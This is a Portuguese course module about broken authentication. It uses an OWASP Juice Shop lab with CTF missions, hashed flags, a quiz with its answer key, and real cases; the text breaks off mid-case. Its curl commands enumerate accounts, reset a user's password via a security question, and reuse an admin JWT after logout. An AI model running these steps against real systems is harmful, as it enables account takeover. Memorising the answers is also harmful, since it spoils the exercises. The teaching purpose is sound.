@@ -1,0 +1,989 @@
+---
+slug: autenticacao-e-sessoes
+track: trilha-4
+title: "Autenticação e sessões quebradas"
+prerequisites: [web-por-dentro]
+lab: juice-shop
+tasks:
+  - slug: missao-1-enumeracao
+    title: "Missão 1 — Enumeração de contas"
+    type: flag
+    prompt: "Quantas das oito contas da lista existem de verdade e qual é o id da pergunta de segurança que o oráculo devolve para mc.safesearch@juice-sh.op, no formato FLAG{quantidade-id}."
+    hint: "Consulte /rest/user/security-question?email=... para cada e-mail da lista. Conta que existe devolve a pergunta (com um campo id); conta que não existe devolve {}. Conte as que existem e leia o id da pergunta do mc.safesearch."
+    flag:
+      hash: "scrypt$16384$8$1$86bbb071928c6636732fc86a7611d132076f3ecb93a3f6a365a591a481a57243"
+      salt: "2046ce28d3356372e8ff4a67f43284f2"
+  - slug: missao-2-reset-jim
+    title: "Missão 2 — Reset de senha do Jim"
+    type: flag
+    prompt: "A key do desafio do Juice Shop que ficou resolvido ao trocar a senha do Jim e a resposta da pergunta de segurança dele, no formato FLAG{key-resposta}."
+    hint: "A pergunta do Jim é o nome do meio do irmão mais velho. As resenhas de produto dele apontam para um universo de ficção; descubra a personagem e o irmão. Com a resposta, faça o POST para /rest/user/reset-password. Depois ache na lista de desafios (/api/Challenges) a key do desafio que virou solved."
+    flag:
+      hash: "scrypt$16384$8$1$0de745bb552ce9a88fbe3a79488c878a3fca1d673bab05c0ce76e9230da11032"
+      salt: "ff8a60f288e7952e428ab18ae508aaaa"
+  - slug: missao-3-sessao-eterna
+    title: "Missão 3 — A sessão que não morre"
+    type: flag
+    prompt: "O que o token de sessão do admin revela ao ser decodificado, no formato FLAG{marcador-hash}, onde o marcador descreve o prazo do token e o hash é o valor do campo password que vaza dentro do payload do JWT."
+    hint: "Faça login como admin, capture o token e decodifique o payload (a segunda parte, Base64url). Procure dois problemas: um campo que deveria existir para limitar a validade e não existe, e um campo que não deveria estar ali. O marcador é a palavra que descreve a falta de prazo; o hash é o valor do campo password."
+    flag:
+      hash: "scrypt$16384$8$1$f0ad1688e22dea577da150f46cbc0ef2775401f6e36a1067de5f8879240bb022"
+      salt: "877e8798be1dab5b2648df9f8469fe9a"
+  - slug: quiz-final
+    title: "Quiz — Autenticação e sessões quebradas"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Qual a diferença entre autenticação (authentication) e autorização (authorization)?"
+        options:
+          - "São sinônimos; os dois termos descrevem o login"
+          - "Autenticação prova QUEM você é (as credenciais); autorização decide O QUE você pode fazer depois de identificado. Falhar na primeira deixa você entrar como outra pessoa"
+          - "Autenticação é no cliente e autorização é no servidor"
+          - "Autorização vem antes da autenticação"
+        answer: 1
+        explanation: "Autenticação responde 'quem é você?' e autorização responde 'você pode fazer isto?'. Este módulo trata de falhas de autenticação e de sessão; o controle de acesso (autorização) é o assunto do 4.5. Trocar as duas confunde o diagnóstico de uma falha."
+      - question: "Por que o HTTP precisa de uma sessão para lembrar que você fez login?"
+        options:
+          - "Porque o HTTP é lento"
+          - "Porque o HTTP é um protocolo sem estado (stateless): cada requisição chega sozinha, sem memória da anterior. A sessão (um cookie ou um token repetido a cada pedido) é o que costura as requisições numa identidade contínua"
+          - "Porque o navegador apaga a memória a cada clique"
+          - "Porque o servidor proíbe mais de uma requisição por conexão"
+        answer: 1
+        explanation: "O HTTP não guarda estado entre requisições. Sem um identificador de sessão repetido a cada pedido (cookie ou token Bearer), o servidor trataria cada clique como um estranho. É por isso que roubar esse identificador equivale a roubar a sessão inteira."
+      - question: "Por que uma pergunta de segurança (security question) é uma forma fraca de recuperar uma senha?"
+        options:
+          - "Porque é difícil de digitar"
+          - "Porque, na prática, é uma segunda senha de baixa entropia, imutável e muitas vezes pública ou pesquisável (nome de solteira da mãe, primeiro pet, cidade natal). Quem acha a resposta reseta a conta sem a senha original"
+          - "Porque o servidor não consegue guardar a resposta"
+          - "Porque exige dois fatores"
+        answer: 1
+        explanation: "O próprio OWASP cita 'respostas baseadas em conhecimento' como recuperação de credencial fraca. A resposta não muda, tem pouquíssimas possibilidades e costuma estar numa rede social ou numa enciclopédia — como no caso Palin. Recuperação segura usa um token aleatório enviado a um canal que só a vítima controla."
+      - question: "Credential stuffing e brute force (força bruta) não são a mesma coisa. Qual é a diferença?"
+        options:
+          - "Nenhuma, são dois nomes do mesmo ataque"
+          - "Brute force testa muitas senhas contra uma conta; credential stuffing reusa pares e-mail/senha já vazados em OUTROS sites, apostando que a vítima repetiu a senha. Por isso o stuffing acerta de primeira e passa por defesas de força bruta"
+          - "Credential stuffing é feito à mão e brute force é automatizado"
+          - "Brute force só funciona em HTTPS"
+        answer: 1
+        explanation: "No brute force o atacante gera/varre senhas contra um alvo. No credential stuffing ele já tem credenciais verdadeiras (de vazamentos alheios) e só testa onde mais elas funcionam — foi o que atingiu o 23andMe em 2023. Password spraying é um terceiro primo: uma senha comum contra muitas contas, para não disparar o bloqueio por conta."
+      - question: "No Juice Shop, o endpoint /rest/user/login devolve exatamente 'Invalid email or password.' tanto para senha errada quanto para usuário inexistente. Já o /rest/user/security-question devolve a pergunta só se a conta existe. O que isso ensina sobre account enumeration?"
+        options:
+          - "Que o login está quebrado"
+          - "Que uma resposta uniforme no login não basta: se QUALQUER outro endpoint (recuperação, cadastro, perfil) reagir diferente para conta existente e inexistente, ele vira um oráculo que lista usuários válidos"
+          - "Que o Juice Shop não tem contas"
+          - "Que a pergunta de segurança é criptografada"
+        answer: 1
+        explanation: "Enumeração não precisa ser no login. O oráculo foi o endpoint de pergunta de segurança, que responde a pergunta para quem existe e {} para quem não existe. Defender enumeração é padronizar a resposta (conteúdo, código e tempo) em todos os fluxos que tocam a existência de uma conta."
+      - question: "No Juice Shop, clicar em 'Sair' (logout) remove o token do navegador, mas um token copiado antes continua funcionando no servidor. Por quê?"
+        options:
+          - "Porque o servidor demora a processar o logout"
+          - "Porque o token é um JWT autocontido e o servidor não mantém server-side session (lista de sessões ativas) nem revoga o token: 'sair' só apaga a cópia do cliente. Sem invalidação no servidor, o token vale até expirar — e aqui ele nem expira"
+          - "Porque o navegador guarda uma cópia escondida"
+          - "Porque o logout só funciona em HTTPS"
+        answer: 1
+        explanation: "Como o servidor confia na assinatura do JWT e não guarda estado de sessão, não há o que invalidar no logout: a lógica roda no cliente. Some a isso a falta de um campo exp e o token roubado vira um passe vitalício. A defesa é expiração curta mais uma lista de revogação (ou sessões no servidor)."
+      - question: "Ao decodificar o JWT do admin do Juice Shop, aparece o campo \"password\":\"0192023a...\" dentro do payload. Qual é o problema?"
+        options:
+          - "Nenhum, é normal o token levar a senha"
+          - "O payload de um JWT é só Base64url, legível por qualquer um que tenha o token: colocar ali o hash da senha (aqui, MD5) expõe material sensível e ainda entrega um hash fraco para quebra offline. O token devia levar o mínimo (um id e o papel)"
+          - "O problema é o token ser muito curto"
+          - "O problema é usar RS256"
+        answer: 1
+        explanation: "JWT não é cifrado, só assinado: o payload é lido com um decode de Base64url. Guardar o hash da senha ali (e um MD5, ainda por cima) soma exposição de dado sensível a um hash fácil de quebrar. Tokens devem carregar o mínimo necessário e nunca segredos."
+      - question: "Qual defesa ataca a RAIZ do credential stuffing, já que as senhas vazadas são verdadeiras?"
+        options:
+          - "Trocar a cor do botão de login"
+          - "Exigir multi-factor authentication (MFA): mesmo com a senha certa, falta o segundo fator (um código TOTP, uma chave). Soma-se rate limiting, bloqueio progressivo e checagem contra listas de senhas vazadas"
+          - "Esconder o formulário de login"
+          - "Usar senhas mais curtas para digitar rápido"
+        answer: 1
+        explanation: "Se a senha é verdadeira, validar melhor a senha não adianta — por isso o MFA é a defesa central: quebra a aposta de que a senha sozinha basta. Rate limiting e bloqueio cortam o volume, e comparar contra corpora de vazamentos barra a senha reciclada antes do ataque."
+      - question: "O que é session fixation e como a defesa se diferencia da de session hijacking?"
+        options:
+          - "São a mesma coisa"
+          - "Na fixation o atacante força a vítima a usar um identificador de sessão que ELE já conhece, e o servidor não troca esse id ao autenticar; a defesa é emitir um id novo no login. No hijacking ele ROUBA um id já válido; a defesa é proteger o id (HttpOnly, Secure, HTTPS, expiração)"
+          - "Fixation é roubo de senha e hijacking é roubo de e-mail"
+          - "Só a fixation existe na prática"
+        answer: 1
+        explanation: "Fixation age ANTES do login (fixar um id conhecido) e se mata rotacionando o identificador na autenticação. Hijacking age DEPOIS (capturar um id válido) e se mata protegendo o identificador no transporte e no armazenamento e dando prazo a ele. São falhas distintas com defesas distintas."
+      - question: "Por que mensagens de erro de login genéricas ('e-mail ou senha inválidos') ajudam a segurança?"
+        options:
+          - "Porque confundem o usuário legítimo de propósito"
+          - "Porque não revelam QUAL campo errou: 'esse e-mail não existe' versus 'senha errada' entregaria a account enumeration. Uma resposta única (mesmo texto, mesmo código, mesmo tempo) nega o oráculo ao atacante"
+          - "Porque são mais bonitas"
+          - "Porque aceleram o servidor"
+        answer: 1
+        explanation: "A diferença entre 'usuário não existe' e 'senha errada' confirma contas válidas. Padronizar a resposta — conteúdo, status e tempo — fecha o vazamento. É barato e some com uma classe inteira de enumeração, desde que valha para todos os fluxos (login, cadastro, recuperação)."
+glossary:
+  - term: broken authentication
+    definition: "Autenticação quebrada: a família de falhas em que um atacante consegue se passar por outro usuário por fraqueza no login, na recuperação de senha ou na gestão da sessão. É a categoria A07:2021 do OWASP Top 10 (antes A02:2017)."
+  - term: credential stuffing
+    definition: "Enchimento de credenciais: ataque que reusa pares e-mail/senha vazados em um site para tentar entrar em outros, apostando que a vítima repetiu a senha. Usa credenciais verdadeiras, então passa por defesas feitas para força bruta."
+  - term: password spraying
+    definition: "Pulverização de senha: testar uma única senha comum (ex.: Senha123) contra muitas contas diferentes, em vez de muitas senhas contra uma conta. Evita o bloqueio por conta, que só conta erros de um mesmo usuário."
+  - term: account enumeration
+    definition: "Enumeração de contas: descobrir quais e-mails ou nomes de usuário existem num sistema, observando respostas diferentes para conta existente e inexistente (mensagem, código de status ou tempo). Prepara ataques direcionados."
+  - term: security question
+    definition: "Pergunta de segurança: uma pergunta pessoal (nome de solteira da mãe, primeiro pet) usada para recuperar a senha. Na prática é uma segunda senha fraca — de baixa entropia, imutável e muitas vezes pública."
+  - term: credential recovery
+    definition: "Recuperação de credencial: o fluxo de 'esqueci minha senha'. Feito com segurança, usa um token aleatório de uso único e com prazo, enviado a um canal que só o dono controla; feito mal, usa perguntas de segurança ou devolve a senha."
+  - term: multi-factor authentication
+    definition: "Autenticação multifator (MFA): exigir mais de uma prova de identidade de categorias diferentes — algo que você sabe (senha), tem (um código TOTP, uma chave) ou é (biometria). Barra o atacante que só tem a senha."
+  - term: TOTP
+    definition: "Time-based One-Time Password: código de 6 dígitos que muda a cada 30 segundos, gerado por um app (Google Authenticator, Aegis) a partir de um segredo combinado no cadastro. Um segundo fator comum em MFA."
+  - term: account lockout
+    definition: "Bloqueio de conta: travar o login (por um tempo ou até ação do dono) depois de várias tentativas erradas, para cortar força bruta. Precisa de cuidado para não virar um jeito de negar acesso ao usuário legítimo (DoS)."
+  - term: rate limiting
+    definition: "Limitação de taxa: impor um teto de requisições por tempo (por IP, por conta, por rota) para conter automação — tentativas de login, reset de senha, enumeração. Desacelera o atacante sem depender de reconhecer a ferramenta dele."
+  - term: localStorage
+    definition: "Armazenamento local do navegador: um cofre de chave/valor por origem, acessível por JavaScript e persistente entre abas e reinícios. O Juice Shop guarda ali o token de sessão — o que o deixa legível por um XSS, ao contrário de um cookie HttpOnly."
+---
+
+import cicloDeSessao from "./img/ciclo-de-sessao.svg";
+import resetPorPergunta from "./img/reset-por-pergunta.svg";
+import fixacaoVsRoubo from "./img/fixacao-vs-roubo.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Você digita e-mail e senha, o site responde "bem-vindo" e, a partir daí, cada
+página sabe que é você. Essa frase esconde dois mecanismos distintos: a
+**autenticação** (provar quem você é, uma vez) e a **sessão** (o sistema
+lembrar disso nas próximas requisições). Quando qualquer um dos dois falha, um
+estranho entra como você — sem arrombar criptografia nenhuma, só explorando a
+lógica de "quem é você e como eu lembro disso".
+
+É um dos buracos mais comuns e mais caros da web. A OWASP mantém uma categoria
+inteira para ele — <GlossaryTerm term="broken authentication">broken
+authentication</GlossaryTerm> (autenticação quebrada), hoje **A07:2021 —
+Identification and Authentication Failures**. Não é teoria: em outubro de 2023,
+a 23andMe perdeu dados de **6,9 milhões** de pessoas porque atacantes entraram
+em contas reusando senhas vazadas de outros sites (você vai ver o caso na
+seção 4). E, lá em 2008, o e-mail de uma candidata a vice-presidente dos EUA
+caiu porque a "pergunta de segurança" era pesquisável no Google.
+
+Neste módulo você ataca essas falhas no OWASP Juice Shop e, principalmente,
+entende por que elas existem e como fechá-las. Vai enumerar quais contas existem
+abusando de um endpoint de recuperação, tomar a conta de um usuário trocando a
+senha dele sem saber a antiga, e provar que a sessão do Juice Shop é um "passe
+vitalício" que o logout não cancela.
+
+**Ao final, você vai saber:**
+
+- distinguir autenticação de autorização e explicar por que o HTTP precisa de
+  uma sessão;
+- fazer <GlossaryTerm term="account enumeration">account enumeration</GlossaryTerm>
+  (enumeração de contas) a partir de respostas que diferenciam quem existe de
+  quem não existe;
+- explicar e diferenciar <GlossaryTerm term="brute force">brute force</GlossaryTerm>,
+  <GlossaryTerm term="credential stuffing">credential stuffing</GlossaryTerm> e
+  <GlossaryTerm term="password spraying">password spraying</GlossaryTerm>;
+- explorar uma <GlossaryTerm term="credential recovery">recuperação de
+  credencial</GlossaryTerm> insegura baseada em <GlossaryTerm term="security question">pergunta
+  de segurança</GlossaryTerm>;
+- mostrar na prática por que um token de <GlossaryTerm term="JWT">JWT</GlossaryTerm>
+  sem expiração e guardado no <GlossaryTerm term="localStorage">localStorage</GlossaryTerm>
+  sobrevive ao logout, e o que um atacante faz com ele;
+- defender cada uma dessas falhas com <GlossaryTerm term="multi-factor authentication">MFA</GlossaryTerm>,
+  <GlossaryTerm term="rate limiting">rate limiting</GlossaryTerm>,
+  <GlossaryTerm term="account lockout">bloqueio</GlossaryTerm>, mensagens
+  genéricas e invalidação de sessão no servidor.
+
+**Pré-requisitos:** 4.1 — Como a web funciona por dentro (você vai usar o HTTP,
+o par requisição/resposta, cookies e `Set-Cookie`, e a ideia de sessão por
+cookie; tudo isso é retomado em uma linha quando aparecer).
+
+**Tempo estimado:** 3 a 4 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+Trocar a senha de outra pessoa, enumerar contas e reutilizar o token de sessão
+de alguém são crimes quando feitos fora de um ambiente autorizado. Aqui, o alvo
+é o Juice Shop do seu laboratório local — uma aplicação feita de propósito para
+ser atacada. Nunca aponte estas técnicas para um site real sem autorização por
+escrito (você viu o enquadramento legal no 1.4).
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 Autenticação, autorização e sessão: três coisas diferentes
+
+Confundir esses três termos é o primeiro erro, então vamos separá-los antes de
+qualquer ataque.
+
+- **Autenticação** (authentication) responde "**quem é você?**". É o login:
+  você apresenta uma credencial (senha, chave, biometria) e o sistema confere.
+- **Autorização** (authorization) responde "**o que você pode fazer?**". Depois
+  de saber quem você é, o sistema decide se você pode ver aquele pedido, apagar
+  aquele usuário, acessar aquele arquivo. É o assunto do próximo módulo (4.5).
+- **Sessão** (session) é a **memória** entre as duas. Como o HTTP é um
+  <GlossaryTerm term="stateless protocol">protocolo sem estado</GlossaryTerm> —
+  cada requisição chega isolada, sem lembrança da anterior —, o sistema precisa
+  de um fio que costure os seus cliques numa identidade contínua. Esse fio é um
+  <GlossaryTerm term="session ID">session ID</GlossaryTerm> (identificador de
+  sessão) que vai e volta a cada requisição, em um
+  <GlossaryTerm term="session cookie">cookie de sessão</GlossaryTerm> ou em um
+  token.
+
+Este módulo ataca a **autenticação** (quem você é) e a **sessão** (como o
+sistema lembra). Guarde a distinção: muita gente chama tudo de "login", mas o
+atacante precisa saber se está quebrando a prova de identidade ou a memória
+dela — as defesas são diferentes.
+
+### 2.2 Como o servidor lembra de você: cookie de sessão x token
+
+Há duas formas clássicas de carregar o identificador de sessão, e o Juice Shop
+usa a segunda. Vale entender as duas, porque a defesa muda.
+
+**Sessão no servidor (server-side session).** O jeito tradicional: ao logar, o
+servidor cria um registro na sua memória/banco ("sessão abc123 = usuário Maria,
+logada às 10h") e manda ao navegador só um identificador opaco, num
+<GlossaryTerm term="session cookie">cookie</GlossaryTerm>. A cada requisição, o
+navegador reenvia o cookie; o servidor procura `abc123` na sua tabela e sabe que
+é a Maria. A informação real mora no servidor — ele é o dono da
+<GlossaryTerm term="server-side session">server-side session</GlossaryTerm>. Para
+deslogar, basta apagar a linha da tabela: o cookie vira lixo na hora.
+
+**Token autocontido (JWT).** O jeito moderno de muitas SPAs. Ao logar, o
+servidor devolve um <GlossaryTerm term="JWT">JWT</GlossaryTerm> (JSON Web Token):
+um objeto JSON com os seus dados (id, papel), codificado em Base64url e
+**assinado** pelo servidor. O servidor **não guarda nada**: a cada requisição,
+o cliente manda o token de volta (em geral no cabeçalho
+`Authorization: Bearer <token>`, um <GlossaryTerm term="Bearer token">Bearer
+token</GlossaryTerm>), e o servidor só confere a assinatura. É cômodo e escala
+bem — mas tem um efeito colateral central para este módulo: **não existe uma
+lista de sessões para invalidar**. Se o servidor confia em qualquer token com
+assinatura válida, "deslogar" não tem o que cancelar no lado dele.
+
+<Callout variant="info" title="JWT é assinado, não cifrado">
+O payload de um JWT é só Base64url: qualquer um que tenha o token lê o conteúdo
+com um decode. A assinatura impede **alterar**, não **ler**. Por isso colocar
+dados sensíveis no token (como o Juice Shop faz, você verá) é um problema por si
+só. A forja de JWT — mudar o conteúdo e burlar a assinatura — é assunto do 3.4;
+aqui o foco é a sessão.
+</Callout>
+
+<Figure
+  src={cicloDeSessao}
+  alt="Diagrama do ciclo de uma sessão por token em quatro etapas entre navegador e servidor: login com e-mail e senha, resposta com o token assinado, uso do token no cabeçalho Authorization Bearer a cada requisição, e o logout, que só apaga a cópia do cliente enquanto o servidor segue aceitando o token. Três caixas vermelhas marcam onde a autenticação quebra: no login (senha fraca ou reaproveitada), no token (legível no navegador e carregando dados demais) e no logout (sem invalidação no servidor e sem expiração)."
+  caption="O ciclo de uma sessão por token. O ponto crítico é a etapa 4: o logout do Juice Shop só apaga a cópia do cliente; o servidor, sem lista de sessões e sem prazo no token, continua aceitando um token copiado."
+/>
+
+### 2.3 Por que a autenticação quebra: o catálogo das falhas
+
+A própria OWASP, ao descrever a categoria A07:2021, lista os sintomas. Vale ler
+como um mapa do que você vai atacar e defender:
+
+- **permite ataques automáticos** como credential stuffing e brute force;
+- **permite senhas padrão, fracas ou conhecidas** ("admin/admin", "Password1");
+- **usa recuperação de senha fraca**, como "respostas baseadas em conhecimento"
+  (as perguntas de segurança);
+- **guarda senhas em claro ou com hash fraco**;
+- **não tem MFA, ou a tem de forma ineficaz**;
+- **expõe o identificador de sessão na URL, reaproveita o id após o login, ou
+  não invalida os IDs de sessão corretamente**.
+
+Repare como esse último item descreve, palavra por palavra, duas falhas deste
+módulo: **reaproveitar o id após o login** é a <GlossaryTerm term="session fixation">session
+fixation</GlossaryTerm> (seção 2.5), e **não invalidar o id** é a sessão eterna
+que você vai explorar na Missão 3.
+
+### 2.4 Senhas: por que brute force, stuffing e spraying são primos diferentes
+
+Os três atacam a senha, mas de ângulos diferentes — e a diferença decide qual
+defesa funciona.
+
+- <GlossaryTerm term="brute force">**Brute force**</GlossaryTerm> (força bruta):
+  muitas senhas contra **uma** conta. "admin + senha1, admin + senha2, ...".
+  Barulhento e lento; some com <GlossaryTerm term="rate limiting">rate
+  limiting</GlossaryTerm> e <GlossaryTerm term="account lockout">bloqueio de
+  conta</GlossaryTerm>.
+- <GlossaryTerm term="credential stuffing">**Credential stuffing**</GlossaryTerm>:
+  o atacante já tem **pares e-mail/senha verdadeiros**, vazados de outro site, e
+  só testa onde mais eles funcionam. Como as credenciais são reais, ele acerta
+  de primeira e **não** dispara defesas de força bruta (uma tentativa por
+  conta). A raiz é o reúso de senha pela vítima; a defesa de raiz é
+  <GlossaryTerm term="multi-factor authentication">MFA</GlossaryTerm>.
+- <GlossaryTerm term="password spraying">**Password spraying**</GlossaryTerm>:
+  **uma** senha comum contra **muitas** contas ("todo mundo + Verao@2024"). Faz
+  uma tentativa por conta de propósito, para ficar abaixo do limiar do bloqueio
+  por conta. Pede defesas que olham o todo (taxa por IP, detecção de padrão),
+  não só por conta.
+
+### 2.5 Sessão: fixação e roubo
+
+Se a senha é a porta, o identificador de sessão é a pulseira da festa: depois de
+entrar, é ela que o segurança olha. Roubar a pulseira é tão bom quanto ter a
+senha — e há dois jeitos.
+
+- <GlossaryTerm term="session fixation">**Session fixation**</GlossaryTerm>
+  (fixação de sessão): o atacante **fixa** um identificador que ele já conhece
+  **antes** do login e engana a vítima para que ela se autentique usando
+  justamente esse id. Se o servidor **não troca o identificador ao autenticar**,
+  a sessão logada passa a ser uma que o atacante já tinha na mão. A defesa é uma
+  linha de conceito: **emitir um id novo no login**.
+- <GlossaryTerm term="session hijacking">**Session hijacking**</GlossaryTerm>
+  (roubo de sessão): a vítima já está logada; o atacante **captura** o
+  identificador válido — por um XSS que lê o <GlossaryTerm term="localStorage">localStorage</GlossaryTerm>
+  (assunto do 4.3), por sniffing de tráfego sem HTTPS (você viu no 2.6), ou por
+  um token sem prazo que vazou num log — e o reaproveita. A defesa é proteger o
+  identificador: <GlossaryTerm term="HttpOnly">HttpOnly</GlossaryTerm> e
+  <GlossaryTerm term="Secure (cookie)">Secure</GlossaryTerm> nos cookies, HTTPS
+  em tudo, e **expiração curta com invalidação no servidor**.
+
+<Figure
+  src={fixacaoVsRoubo}
+  alt="Comparação lado a lado de dois ataques de sessão. À esquerda, session fixation: o atacante obtém um identificador de sessão em branco, induz a vítima a logar com esse mesmo identificador e, como o servidor não o troca na autenticação, passa a compartilhar a sessão logada; a defesa é emitir um identificador novo no login. À direita, session hijacking: a vítima já está logada, o atacante captura o token por XSS lendo o localStorage, por sniffing sem HTTPS ou por um token sem prazo vazado, e o reaproveita; as defesas são HttpOnly, Secure, HTTPS e expiração com invalidação no servidor."
+  caption="Fixation age antes do login (fixar um id conhecido) e morre com a rotação do id na autenticação; hijacking age depois (roubar um id válido) e morre protegendo e expirando o id. São falhas distintas com defesas distintas."
+/>
+
+### 2.6 A recuperação de senha: a porta dos fundos
+
+De nada adianta uma senha forte se o "esqueci minha senha" deixa qualquer um
+entrar. A <GlossaryTerm term="credential recovery">recuperação de
+credencial</GlossaryTerm> é, com frequência, o elo mais fraco, porque troca a
+senha — o fator que você controla — por **outra prova**. Quando essa outra prova
+é uma <GlossaryTerm term="security question">pergunta de segurança</GlossaryTerm>
+("nome de solteira da sua mãe", "seu primeiro pet"), o problema é que ela é, na
+prática, uma segunda senha **ruim**: tem pouquíssimas respostas plausíveis
+(baixa entropia), **não muda** e muitas vezes está numa rede social, numa
+entrevista ou numa enciclopédia. É exatamente o que você vai explorar na
+Missão 2, e o que derrubou o e-mail de Sarah Palin em 2008.
+
+## 3. Como o ataque funciona — a mecânica
+
+Vamos ver a mecânica das três falhas que você vai explorar, com as requisições
+reais do Juice Shop. Todos os comandos rodam de dentro do Kali, a única máquina
+que alcança o alvo em `http://juice-shop:3000/`.
+
+### 3.1 Enumeração: achar o oráculo
+
+Enumerar contas é procurar um endpoint que reaja **diferente** para quem existe
+e para quem não existe. O login do Juice Shop é bem-comportado — veja: senha
+errada e usuário inexistente devolvem a **mesma** resposta.
+
+```console
+$ curl -s -o /dev/null -w "status=%{http_code} size=%{size_download}\n" \
+    -X POST http://juice-shop:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"admin@juice-sh.op","password":"errada"}'
+status=401 size=26
+$ curl -s -o /dev/null -w "status=%{http_code} size=%{size_download}\n" \
+    -X POST http://juice-shop:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"naoexiste@juice-sh.op","password":"errada"}'
+status=401 size=26
+```
+
+Mesmo status, mesmo tamanho, mesma mensagem ("Invalid email or password."). O
+login não é o oráculo. Mas a **recuperação de senha** é: o endpoint que devolve
+a pergunta de segurança só a devolve se a conta existir.
+
+```console
+$ curl -s "http://juice-shop:3000/rest/user/security-question?email=jim@juice-sh.op"
+{"question":{"id":1,"question":"Your eldest siblings middle name?",...}}
+$ curl -s "http://juice-shop:3000/rest/user/security-question?email=ninguem@juice-sh.op"
+{}
+```
+
+Aí está o vazamento: conta que existe devolve a pergunta (com um `id`); conta
+que não existe devolve `{}`. Com isso, você percorre uma lista de e-mails e
+separa os reais dos inventados — e ainda descobre **qual** pergunta cada conta
+usa, o que estreita o OSINT do próximo passo.
+
+### 3.2 Reset de senha: trocar a senha sem a senha
+
+Descoberta a conta e a pergunta, o ataque de recuperação tem três passos.
+
+<Figure
+  src={resetPorPergunta}
+  alt="Fluxo em três passos do reset de senha por pergunta de segurança. Passo 1, enumerar: o atacante consulta o endpoint de pergunta de segurança com um e-mail e, se a conta existe, recebe a pergunta, o que também confirma a existência. Passo 2, OSINT: a pergunta pede um dado público ou pesquisável; as resenhas do Jim citam Star Trek, levando a James Kirk e ao irmão George Samuel, logo a resposta é Samuel. Passo 3, resetar: o atacante envia e-mail, resposta e nova senha ao endpoint de reset, que troca a senha sem exigir a senha antiga nem um token por e-mail, e a conta é tomada. Caixas abaixo explicam a raiz do problema e a defesa correta com token aleatório de uso único enviado a um canal que só a vítima controla."
+  caption="Os três passos do reset inseguro: enumerar a conta, achar por OSINT a resposta da pergunta e trocar a senha direto — sem a senha antiga e sem um token enviado ao e-mail da vítima."
+/>
+
+O passo que parece mágica é o OSINT. A pergunta do Jim é "o nome do meio do seu
+irmão mais velho". Não há como adivinhar — mas o Juice Shop deixa o rastro nas
+**resenhas de produto** que o Jim escreveu:
+
+```console
+$ curl -s http://juice-shop:3000/rest/products/20/reviews
+...{"message":"Looks so much better on my uniform than the boring Starfleet symbol.","author":"jim@juice-sh.op"}...
+```
+
+"Starfleet symbol", "replicator", "Bones' new tricorder": o Jim é um personagem
+de **Star Trek**. O "Jim" de Star Trek é o capitão James T. Kirk, cujo irmão mais velho é
+**George Samuel Kirk** — chamado de Sam. O nome do meio: **Samuel**. Esse é o
+tipo de dedução que a pergunta de segurança não resiste.
+
+Com a resposta, o terceiro passo é um único POST — e repare no que ele **não**
+pede: a senha antiga e um token enviado ao e-mail da vítima.
+
+```console
+$ curl -s -X POST http://juice-shop:3000/rest/user/reset-password \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"jim@juice-sh.op","answer":"Samuel","new":"NovaSenha123!","repeat":"NovaSenha123!"}'
+{"user":{...}}
+```
+
+A conta é sua. É a Missão 2.
+
+### 3.3 Sessão: o token que o logout não mata
+
+Faça um login honesto como admin e capture o token. Depois, decodifique o
+payload (a segunda parte do JWT, separada por pontos, em Base64url):
+
+```console
+$ TOKEN=$(curl -s -X POST http://juice-shop:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
+    | python3 -c "import sys,json;print(json.load(sys.stdin)['authentication']['token'])")
+$ echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
+{"data":{"id":1,"email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin",...},"iat":1791296926}
+```
+
+Dois problemas saltam. Primeiro, o payload traz `"password":"0192023a..."` — o
+**hash da senha** do admin, dentro do token que o servidor entrega ao cliente
+(é o MD5 de `admin123`, um hash fraco). Segundo, e central para esta missão: há
+`iat` (emitido em), mas **não há `exp`** (expira em). O token não tem prazo.
+
+Agora a prova de que o logout não o invalida. O "Sair" do Juice Shop é código
+que roda no navegador: ele apaga o token do `localStorage` e pronto. O servidor
+não é avisado, não guarda sessões e não revoga nada. Um token capturado continua
+valendo:
+
+```console
+$ curl -s -o /dev/null -w "basket reusado status=%{http_code}\n" \
+    http://juice-shop:3000/rest/basket/1 \
+    -H "Authorization: Bearer $TOKEN"
+basket reusado status=200
+```
+
+Mesmo "depois do logout", o token abre um recurso que só o dono deveria ver. É a
+Missão 3: um token sem prazo, carregando o hash da senha, que o logout não mata.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### Sarah Palin e a pergunta de segurança pesquisável (setembro de 2008)
+
+Em **16 de setembro de 2008**, em plena campanha presidencial dos EUA, a conta
+pessoal de e-mail no Yahoo! da então candidata a vice-presidente Sarah Palin foi
+invadida. Não houve exploit: o atacante, David Kernell, usou o **"esqueci minha
+senha"** do Yahoo!, que pedia respostas a perguntas pessoais — data de
+nascimento, CEP e **onde ela conheceu o marido**. Tudo isso estava disponível em
+reportagens e na Wikipedia. Kernell respondeu, redefiniu a senha e leu a caixa
+de entrada, postando trechos no fórum 4chan.
+
+- **Impacto:** acesso total ao e-mail pessoal de uma candidata à vice-presidência
+  dos EUA; o caso virou símbolo da fragilidade das perguntas de segurança.
+  Kernell foi condenado em abril de 2010 (acesso não autorizado e obstrução de
+  justiça) e sentenciado em novembro de 2010 a um ano e um dia.
+- **Lição:** uma pergunta de segurança é só tão secreta quanto o Google permite.
+  É exatamente a falha da Missão 2 deste módulo. Recuperação segura não pergunta
+  "qual o nome do seu pet"; ela manda um token aleatório ao canal que só o dono
+  controla.
+- **Fonte:** [Sarah Palin email hack — Wikipedia](https://en.wikipedia.org/wiki/Sarah_Palin_email_hack)
+  (com as fontes primárias: autos do processo e cobertura da Wired).
+
+### 23andMe: credential stuffing e o efeito em cascata (outubro de 2023)
+
+Em **outubro de 2023**, um atacante anunciou num fórum ter dados de milhões de
+usuários da empresa de testes genéticos 23andMe. A investigação, confirmada pela
+própria empresa em **dezembro de 2023**, mostrou um ataque de
